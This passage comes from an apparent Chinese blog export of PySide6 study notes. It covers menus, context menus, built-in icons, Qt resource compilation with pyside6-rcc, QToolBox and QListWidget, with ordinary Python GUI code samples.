class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QMainWindow<br><span class=\"hljs-keyword\">from</span> ui <span class=\"hljs-keyword\">import</span> Ui_MainWindow<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(QMainWindow, Ui_MainWindow):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.setupUi(self)<br>        <span class=\"hljs-comment\"># 这个词的意思是     触发   加ed是被动语态 此处使用被动语态体现了作者代码的严谨性准确性......</span><br>        self.actionOpen.triggered.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;Open&#x27;</span>))<br>        self.actionClear.triggered.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;Clear&#x27;</span>))<br>        self.actionSave.triggered.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;Save&#x27;</span>))<br>        self.actionInsert.triggered.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;Insert&#x27;</span>))<br>        self.actionAdd.triggered.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;Add&#x27;</span>))<br>        <span class=\"hljs-comment\"># 懒得写了就这些吧</span><br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-代码层面——手敲三个控件\"><a href=\"#2-代码层面——手敲三个控件\" class=\"headerlink\" title=\"2 代码层面——手敲三个控件\"></a>2 代码层面——手敲三个控件</h2><p>这个思路就是：</p>\n<p>1 创建action</p>\n<p>2 将action添加到menu里面</p>\n<p>3 将menu添加到QMainWindow自带的menuBar当中</p>\n<p>他和前面QWidget里面讲的布局一样，</p>\n<p>同样是可以像文件夹一样可以无限嵌套的</p>\n<h3 id=\"坑\"><a href=\"#坑\" class=\"headerlink\" title=\"坑\"></a>坑</h3><p>又是PyCharm的代码补全惹的祸，</p>\n<p>在给menu添加action的时候使用的方法应该是addAction，</p>\n<p>而不是addAction<strong>s</strong>!</p>\n<h3 id=\"代码-2\"><a href=\"#代码-2\" class=\"headerlink\" title=\"代码\"></a>代码</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QMainWindow, QMenu, QStyle<br><span class=\"hljs-keyword\">from</span> PySide6.QtGui <span class=\"hljs-keyword\">import</span> QAction<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QMainWindow</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br><br>        self.menu = self.menuBar()<br><br>        <span class=\"hljs-comment\"># 设置图标</span><br>        self.openAction = QAction(self.style().standardIcon(QStyle.StandardPixmap.SP_FileIcon), <span class=\"hljs-string\">&#x27;打开文件&#x27;</span>)<br>        self.closeAction = QAction(<span class=\"hljs-string\">&#x27;关闭文件&#x27;</span>)<br><br>        self.moreMenu = QMenu(<span class=\"hljs-string\">&#x27;更多&#x27;</span>)<br>        self.saveAction = QAction(<span class=\"hljs-string\">&#x27;保存&#x27;</span>)<br>        self.saveAsAction = QAction(<span class=\"hljs-string\">&#x27;另存为&#x27;</span>)<br>        self.moreMenu.addAction(self.saveAction)<br>        self.moreMenu.addAction(self.saveAsAction)<br><br>        self.fileMenu = QMenu(<span class=\"hljs-string\">&#x27;文件&#x27;</span>)<br>        self.fileMenu.addAction(self.openAction)<br>        self.fileMenu.addAction(self.closeAction)<br>        self.fileMenu.addMenu(self.moreMenu)<br><br>        self.menu.addMenu(self.fileMenu)<br><br>        self.openAction.triggered.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;open&#x27;</span>))<br>        self.closeAction.triggered.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;close&#x27;</span>))<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n","categories":["PySide6"],"tags":["python"]},{"title":"PySide6学习笔记#17","url":"/2023/05/09/PySide6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-17/","content":"<p>今天的内容是内置的图标以及资源的加载</p>\n<p>这两个内容就是一整个章节“资源的加载”的全部内容</p>\n<span id=\"more\"></span>\n\n<h1 id=\"内置图标设置\"><a href=\"#内置图标设置\" class=\"headerlink\" title=\"内置图标设置\"></a>内置图标设置</h1><p>这个之前好像是讲过的</p>\n<p>没什么难度记住就行了</p>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QLabel, QStyle, QVBoxLayout<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br><br>        self.lb = QLabel()<br>        <span class=\"hljs-comment\"># 标准格式</span><br>        self.lb.setPixmap(self.style().standardPixmap(QStyle.StandardPixmap.SP_FileIcon))<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.lb)<br>        self.setLayout(self.mainLayout)<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>注意在我写的注释下面一行那里是standardPixmap<strong>第一个s不是大写的</strong></p>\n<p>我就被PyCharm的代码补全又坑了一次</p>\n<p>依旧速通</p>\n<h1 id=\"资源的加载\"><a href=\"#资源的加载\" class=\"headerlink\" title=\"资源的加载\"></a>资源的加载</h1><p>这个rcc后缀的文件经常见到，</p>\n<p>看来他就是一个类似于zip的东西，</p>\n<p>与zip不同的是rcc不是面向人类的而是面向计算机的</p>\n<h2 id=\"代码-1\"><a href=\"#代码-1\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QVBoxLayout, QLabel<br><span class=\"hljs-keyword\">from</span> PySide6.QtGui <span class=\"hljs-keyword\">import</span> QPixmap<br><span class=\"hljs-keyword\">import</span> test<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br><br>        self.lb = QLabel()<br>        self.lb.setPixmap(QPixmap(<span class=\"hljs-string\">&#x27;:/image/24.png&#x27;</span>))<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.lb)<br>        self.setLayout(self.mainLayout)<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>这里提一嘴如果编辑器是pycharm不可以通过插件将qrc文件编译为py的话，</p>\n<p>可以用命令行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">pyside6-rcc test.qrc -o test.py<br></code></pre></td></tr></table></figure>\n","categories":["PySide6"],"tags":["python"]},{"title":"PySide6学习笔记#16","url":"/2023/05/07/PySide6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-16/","content":"<p>今天学习上下文菜单（就是右键菜单），</p>\n<p>以及容器菜单ToolBox（选项卡）</p>\n<span id=\"more\"></span>\n\n<h1 id=\"窗体绑定右键菜单\"><a href=\"#窗体绑定右键菜单\" class=\"headerlink\" title=\"窗体绑定右键菜单\"></a>窗体绑定右键菜单</h1><p>这个依旧很简单没什么难度，</p>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QVBoxLayout, QMenu, QMenuBar<br><span class=\"hljs-keyword\">from</span> PySide6.QtGui <span class=\"hljs-keyword\">import</span> QAction<br><span class=\"hljs-keyword\">from</span> PySide6.QtCore <span class=\"hljs-keyword\">import</span> Qt<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        <span class=\"hljs-comment\"># 设置上下文菜单策略</span><br>        self.setContextMenuPolicy(Qt.ContextMenuPolicy.ActionsContextMenu)<br>        <span class=\"hljs-comment\"># 创建action并添加到主窗口</span><br>        self.acton1 = QAction(<span class=\"hljs-string\">&#x27;1&#x27;</span>)<br>        self.acton2 = QAction(<span class=\"hljs-string\">&#x27;2&#x27;</span>)<br><br>        self.addActions([self.acton1, self.acton2])<br><br>        self.acton1.triggered.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;1&#x27;</span>))<br>        self.acton2.triggered.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;2&#x27;</span>))<br><br>        self.mainLayout = QVBoxLayout()<br>        self.setLayout(self.mainLayout)<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>正常运行</p>\n\n\n<h2 id=\"笔记\"><a href=\"#笔记\" class=\"headerlink\" title=\"笔记\"></a>笔记</h2>\n\n<h1 id=\"控件绑定右键菜单\"><a href=\"#控件绑定右键菜单\" class=\"headerlink\" title=\"控件绑定右键菜单\"></a>控件绑定右键菜单</h1><p>其实原理和前面的窗体绑定右键菜单是差不多的</p>\n<h2 id=\"代码-1\"><a href=\"#代码-1\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QVBoxLayout, QPushButton<br><span class=\"hljs-keyword\">from</span> PySide6.QtGui <span class=\"hljs-keyword\">import</span> QAction<br><span class=\"hljs-keyword\">from</span> PySide6.QtCore <span class=\"hljs-keyword\">import</span> Qt<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        <span class=\"hljs-comment\"># 设置上下文菜单策略</span><br>        self.setContextMenuPolicy(Qt.ContextMenuPolicy.ActionsContextMenu)<br>        <span class=\"hljs-comment\"># 创建action并添加到主窗口</span><br>        self.acton1 = QAction(<span class=\"hljs-string\">&#x27;1&#x27;</span>)<br>        self.acton2 = QAction(<span class=\"hljs-string\">&#x27;2&#x27;</span>)<br><br>        self.addActions([self.acton1, self.acton2])<br><br>        <span class=\"hljs-comment\"># 创建控件并对控件进行右键菜单的绑定</span><br>        self.btn = QPushButton(<span class=\"hljs-string\">&#x27;Btn1&#x27;</span>)<br>        self.btn2 = QPushButton(<span class=\"hljs-string\">&#x27;Btn2&#x27;</span>)<br>        self.btn.setContextMenuPolicy((Qt.ContextMenuPolicy.ActionsContextMenu))<br>        self.btn2.setContextMenuPolicy((Qt.ContextMenuPolicy.ActionsContextMenu))<br>        self.btn.addActions([self.acton1, self.acton2])<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.btn)<br>        self.mainLayout.addWidget(self.btn2)<br>        self.setLayout(self.mainLayout)<br>        self.bind()<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">bind</span>(<span class=\"hljs-params\">self</span>):<br>        self.acton1.triggered.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;1&#x27;</span>))<br>        self.acton2.triggered.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;2&#x27;</span>))<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>其实就是在self后面加上控件的名字就好了</p>\n<h1 id=\"折叠选项卡\"><a href=\"#折叠选项卡\" class=\"headerlink\" title=\"折叠选项卡\"></a>折叠选项卡</h1><p>这个东西的代码量有点大，</p>\n<p>我在这里遇到了一个有趣的bug</p>\n<h2 id=\"错误代码\"><a href=\"#错误代码\" class=\"headerlink\" title=\"错误代码\"></a>错误代码</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QLabel, QPushButton, QVBoxLayout, QToolBox, QStyle<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br><br>        <span class=\"hljs-comment\"># 创建一个图标</span><br>        self.icon = self.style().standardIcon(QStyle.StandardPixmap.SP_ArrowDown)<br><br>        self.toolBox = QToolBox()<br>        self.toolBox2 = QToolBox()<br><br>        <span class=\"hljs-comment\"># 创建一个折叠卡选项内容</span><br>        self.widget1 = QWidget()<br>        self.widget1Layout = QVBoxLayout()<br>        self.widget1Layout.addWidget(QPushButton(<span class=\"hljs-string\">&#x27;按钮1&#x27;</span>))<br>        self.widget1Layout.addWidget(QLabel(<span class=\"hljs-string\">&#x27;标签1&#x27;</span>))<br>        self.widget1.setLayout(self.widget1Layout)<br><br>        <span class=\"hljs-comment\"># 创建两个更加直观一点</span><br>        self.widget2 = QWidget()<br>        self.widget2Layout = QVBoxLayout()<br>        self.widget2Layout.addWidget(QPushButton(<span class=\"hljs-string\">&#x27;按钮2&#x27;</span>))<br>        self.widget2Layout.addWidget(QLabel(<span class=\"hljs-string\">&#x27;标签2&#x27;</span>))<br>        self.widget2.setLayout(self.widget2Layout)<br><br>        self.toolBox.addItem(self.widget1, self.icon, <span class=\"hljs-string\">&#x27;选项卡一&#x27;</span>)<br>        self.toolBox2.addItem(self.widget2, self.icon, <span class=\"hljs-string\">&#x27;选项卡二&#x27;</span>)<br><br>        <span class=\"hljs-comment\"># 主窗口布局</span><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.toolBox)<br>        self.mainLayout.addWidget(self.toolBox2)<br>        self.setLayout(self.mainLayout)<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>乍一眼看上去是不是没有什么问题，</p>\n<p>但是运行之后就会发现这个选项卡不是折叠的，</p>\n<p>然后仔细一对比up的代码发现，</p>\n<p>toolbox里面可以添加很多item，</p>\n<p>他就像一个文件夹一样，</p>\n<p>可以添加很多其他的文件夹，</p>\n<p>如果是我上面的代码的话，</p>\n<p>就是把两个文件夹添加到了布局里面，</p>\n<p>而不是一个含有两个文件夹的大文件夹添加到布局里，</p>\n<p>所以代码运行没有问题但是折叠不起来</p>\n<p>这里我对第14行和21行有点小疑问，</p>\n<p>创建一个QWidget对象之前好像没有讲过，</p>\n<p>于是chatgpt了一下</p>\n\n\n\n\n<p>gpt就是给力(๑•̀ㅂ•́)و✧</p>\n<h2 id=\"正确代码\"><a href=\"#正确代码\" class=\"headerlink\" title=\"正确代码\"></a>正确代码</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QLabel, QPushButton, QVBoxLayout, QToolBox, QStyle<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br><br>        <span class=\"hljs-comment\"># 创建一个图标</span><br>        self.icon = self.style().standardIcon(QStyle.StandardPixmap.SP_ArrowDown)<br><br>        self.toolBox = QToolBox()<br><br>        <span class=\"hljs-comment\"># 创建一个折叠卡选项内容 就是一个类似于子窗口的东西</span><br>        self.widget1 = QWidget()<br>        self.widget1Layout = QVBoxLayout()<br>        self.widget1Layout.addWidget(QPushButton(<span class=\"hljs-string\">&#x27;按钮1&#x27;</span>))<br>        self.widget1Layout.addWidget(QLabel(<span class=\"hljs-string\">&#x27;标签1&#x27;</span>))<br>        self.widget1.setLayout(self.widget1Layout)<br><br>        <span class=\"hljs-comment\"># 创建两个更加直观一点</span><br>        self.widget2 = QWidget()<br>        self.widget2Layout = QVBoxLayout()<br>        self.widget2Layout.addWidget(QPushButton(<span class=\"hljs-string\">&#x27;按钮2&#x27;</span>))<br>        self.widget2Layout.addWidget(QLabel(<span class=\"hljs-string\">&#x27;标签2&#x27;</span>))<br>        self.widget2.setLayout(self.widget2Layout)<br><br>        self.toolBox.addItem(self.widget1, self.icon, <span class=\"hljs-string\">&#x27;选项卡一&#x27;</span>)<br>        self.toolBox.addItem(self.widget2, self.icon, <span class=\"hljs-string\">&#x27;选项卡二&#x27;</span>)<br><br>        <span class=\"hljs-comment\"># 主窗口布局</span><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.toolBox)<br>        self.setLayout(self.mainLayout)<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"笔记-1\"><a href=\"#笔记-1\" class=\"headerlink\" title=\"笔记\"></a>笔记</h2>\n","categories":["PySide6"],"tags":["python"]},{"title":"PySide6学习笔记#18","url":"/2023/05/10/PySide6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-18/","content":"<p>今天是界面的美化之隐藏窗口标题栏，Pydracula就跳过了，</p>\n<p>然后重点是QlistWidget的学习</p>\n<span id=\"more\"></span>\n\n<p>前面一节课讲美化的我之前已经发过博客了</p>\n<h1 id=\"隐藏标题栏\"><a href=\"#隐藏标题栏\" class=\"headerlink\" title=\"隐藏标题栏\"></a>隐藏标题栏</h1><p>这个的弊端就是无法通过鼠标来控制这个窗口的位置了，</p>\n<p>但是可以通过鼠标事件，</p>\n<p>这个是后面的内容这里就先跳过了</p>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QVBoxLayout, QPushButton, QLineEdit<br><span class=\"hljs-keyword\">from</span> PySide6.QtCore <span class=\"hljs-keyword\">import</span> Qt<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        <span class=\"hljs-comment\"># 记住这行代码就可以了</span><br>        self.setWindowFlag(Qt.WindowType.FramelessWindowHint)<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>就是一行代码的事情</p>\n<h1 id=\"QListWidget\"><a href=\"#QListWidget\" class=\"headerlink\" title=\"QListWidget\"></a>QListWidget</h1><p>这个组件我觉得和python的数据类型列表有点相似之处，</p>\n<h2 id=\"基本方法\"><a href=\"#基本方法\" class=\"headerlink\" title=\"基本方法\"></a>基本方法</h2><p>例如append对应的是里面的addItem，</p>\n<p>insert对应的就是insertItem</p>\n<p>当然可以加上<strong>s</strong>，然后参数传入一个可迭代对象</p>\n<p>这里up提到，用一个叫做QlistWidgetItem的库比直接插入字符串要好，</p>\n<p>因为直接传入的字符串会在运行的时候隐式转换成这个QListWidgetItem，</p>\n<p>并且这个库有一些自定义的属性，</p>\n<p>例如可以自定义图标什么的，</p>\n<p>我这里列几个属性以及方法以及槽</p>\n<ul>\n<li>addItem 添加一个项，参数传入字符串</li>\n<li>addItems 添加多个项，参数传入列表</li>\n<li>insertItem 插入一个项，用法同python列表的insert</li>\n<li>insertItems 插入一个列表，用法见上</li>\n<li>item 获取指定索引对应的项，传入索引，可以用来修改列表内容</li>\n<li>takeItem 传入索引，用法同python列表的pop，删除元素</li>\n<li>findItems 传入搜索关键词以及搜索规则 规则在核心库里面</li>\n<li>count 返回列表的长度</li>\n<li>clear 清空列表</li>\n</ul>\n<p>信号什么的可以自己去qt助手里面看，</p>\n<p>反正最常用的就是</p>\n<p>currentItemChanged</p>\n<p>currentItem().text()</p>\n<h3 id=\"笔记\"><a href=\"#笔记\" class=\"headerlink\" title=\"笔记\"></a>笔记</h3>\n\n<p>and</p>\n\n\n<p>and</p>\n\n\n<h2 id=\"基本信号\"><a href=\"#基本信号\" class=\"headerlink\" title=\"基本信号\"></a>基本信号</h2><p>没什么好说的了直接看笔记吧</p>\n<h3 id=\"笔记-1\"><a href=\"#笔记-1\" class=\"headerlink\" title=\"笔记\"></a>笔记</h3>\n\n<h2 id=\"列表排序\"><a href=\"#列表排序\" class=\"headerlink\" title=\"列表排序\"></a>列表排序</h2><p>上面讲了一些简单的增删改查</p>\n<p>今天的内容是列表的排序</p>\n<p>这个其实就是一行代码的事情</p>\n<h3 id=\"笔记-2\"><a href=\"#笔记-2\" class=\"headerlink\" title=\"笔记\"></a>笔记</h3>\n\n<h2 id=\"上下文菜单\"><a href=\"#上下文菜单\" class=\"headerlink\" title=\"上下文菜单\"></a>上下文菜单</h2><p>大家应该都多多少少见过远控吧，</p>\n<p>在对上线主机右键的时候出现的就是这个，</p>\n<p><strong>上下文菜单</strong></p>\n<h3 id=\"笔记-3\"><a href=\"#笔记-3\" class=\"headerlink\" title=\"笔记\"></a>笔记</h3>\n\n<h2 id=\"选中和选择\"><a href=\"#选中和选择\" class=\"headerlink\" title=\"选中和选择\"></a>选中和选择</h2><ul>\n<li>选择</li>\n</ul>\n<p>选择是在每个item前面有一个复选框，</p>\n<p>对应的信号就是itemChanged</p>\n<ul>\n<li>选中</li>\n</ul>\n<p>选中时鼠标点击到哪一个就是点击</p>\n<p>（很遗憾这个没有笔记</p>\n<h2 id=\"代码-1\"><a href=\"#代码-1\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QVBoxLayout, QListWidget<br><span class=\"hljs-keyword\">from</span> PySide6.QtCore <span class=\"hljs-keyword\">import</span> Qt<br><span class=\"hljs-keyword\">from</span> faker <span class=\"hljs-keyword\">import</span> Faker<br><span class=\"hljs-keyword\">from</span> PySide6.QtGui <span class=\"hljs-keyword\">import</span> QAction<br><span class=\"hljs-comment\"># import random</span><br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.fake = Faker(locale=<span class=\"hljs-string\">&#x27;zh_CN&#x27;</span>)<br><br>        self.listWidget = QListWidget()<br>        <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">20</span>):<br>            self.listWidget.addItem(self.fake.name())<br>            <span class=\"hljs-comment\"># self.listWidget.addItem(str(random.randint(0, 100)))</span><br><br>        <span class=\"hljs-comment\"># 插入</span><br>        self.listWidget.insertItems(<span class=\"hljs-number\">0</span>, [<span class=\"hljs-string\">&#x27;插入的内容1&#x27;</span>, <span class=\"hljs-string\">&#x27;插入的内容2&#x27;</span>, <span class=\"hljs-string\">&#x27;插入的内容3&#x27;</span>])<br>        <span class=\"hljs-comment\"># 删除</span><br>        self.listWidget.takeItem(<span class=\"hljs-number\">0</span>)<br>        <span class=\"hljs-comment\"># 修改</span><br>        itemGet = self.listWidget.item(<span class=\"hljs-number\">0</span>)<br>        itemGet.setText(<span class=\"hljs-string\">&#x27;修改后的内容&#x27;</span>)<br>        <span class=\"hljs-comment\"># 查 返回可迭代的object对象</span><br>        result = self.listWidget.findItems(<span class=\"hljs-string\">&#x27;2&#x27;</span>, Qt.MatchFlag.MatchContains)<br>        <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> result:<br>            <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;搜索到的内容：&#x27;</span>+i.text())<br>        <span class=\"hljs-comment\"># 查询列表长度</span><br>        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;列表长度：&#x27;</span>+<span class=\"hljs-built_in\">str</span>(self.listWidget.count()))<br>        <span class=\"hljs-comment\"># 窗体的上下文菜单(右键菜单)</span><br>        self.action = QAction(<span class=\"hljs-string\">&#x27;1&#x27;</span>)<br>        self.action2 = QAction(<span class=\"hljs-string\">&#x27;2&#x27;</span>)<br>        self.setContextMenuPolicy(Qt.ContextMenuPolicy.ActionsContextMenu)<br>        self.addActions([self.action, self.action2])<br>        self.action.triggered.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;事件1被触发了&#x27;</span>))<br>        self.action2.triggered.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;事件2被触发了&#x27;</span>))<br>        <span class=\"hljs-comment\"># 控件的上下文菜单(右键菜单)</span><br>        self.action3 = QAction(<span class=\"hljs-string\">&#x27;3&#x27;</span>)<br>        self.action4 = QAction(<span class=\"hljs-string\">&#x27;4&#x27;</span>)<br>        self.listWidget.setContextMenuPolicy(Qt.ContextMenuPolicy.ActionsContextMenu)<br>        self.listWidget.addActions([self.action3, self.action4])<br>        self.action3.triggered.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;列表中的事件1被触发了&#x27;</span>))<br>        self.action4.triggered.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;列表中的事件2被触发了&#x27;</span>))<br>        <span class=\"hljs-comment\"># 选择和选中</span><br>        